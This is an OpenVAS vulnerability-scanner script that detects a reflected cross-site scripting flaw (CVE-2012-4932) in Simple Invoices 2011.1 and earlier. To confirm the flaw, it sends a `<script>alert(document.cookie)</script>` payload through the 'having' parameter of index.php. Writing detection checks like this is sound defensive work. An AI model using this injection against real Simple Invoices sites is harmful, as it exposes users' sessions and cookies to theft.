###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_simple_invoices_mult_xss_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Simple Invoices Multple Cross Site Scripting Vulnerabilities
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to insert arbitrary HTML and
  script code, which will be executed in a user's browser session in the
  context of an affected site when the malicious data is being viewed.
  Impact Level: Application";
tag_affected = "Simple Invoices version 2011.1 and prior";
tag_insight = "Input passed via the 'having' parameter to index.php
  (when 'module' and 'view' are set to different actions) is not properly
  sanitised before it is returned to the user.";
tag_solution = "No solution or patch is available as of 11th December, 2012. Information
  regarding this issue will updated once the solution details are available.
  For updates refer to http://www.simpleinvoices.org/";
tag_summary = "This host is running Simple Invoices and is prone to multiple cross site
  scripting vulnerabilities.";

if(description)
{
  script_id(803073);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2012-4932");
  script_bugtraq_id(56882);
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-12-11 13:59:06 +0530 (Tue, 11 Dec 2012)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_name("Simple Invoices Multple Cross Site Scripting Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.osvdb.org/88323");
  script_xref(name : "URL" , value : "http://www.osvdb.org/88332");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/80625");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Dec/73");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118737/simpleinvoices-xss.txt");

  script_description(desc);
  script_summary("Check if Simple Invoices is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80, 8877);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}

##
## The script code starts here
##

include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
siPort = 0;
url = "";
dir = "";
pageid = "";

## Get HTTP port
siPort = get_http_port(default:8877);
if(!siPort){
  siPort = 80;
}

if(!get_port_state(siPort)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:siPort)){
  exit(0);
}

foreach dir (make_list("/simpleinvoices", "/invoice", "", cgi_dirs()))
{
  url = dir + "/index.php";

  if(http_vuln_check(port:siPort, url:url, pattern:">Simple Invoices",
                 check_header:TRUE, extra_check:make_list('>Dashboard','>Settings')))
  {
    ## Construct the Attack Request
    url = url + '?module=invoices&view=manage&having=' +
                '<script>alert(document.cookie)</script>';

    ## Confirm exploit worked properly or not
    if(http_vuln_check(port:siPort, url:url, check_header:TRUE,
                       pattern:"<script>alert\(document.cookie\)</script>",
                       extra_check:make_list('>Simple Invoices', '>Dashboard')))
    {
      security_warning(port:siPort);
      exit(0);
    }
  }
}
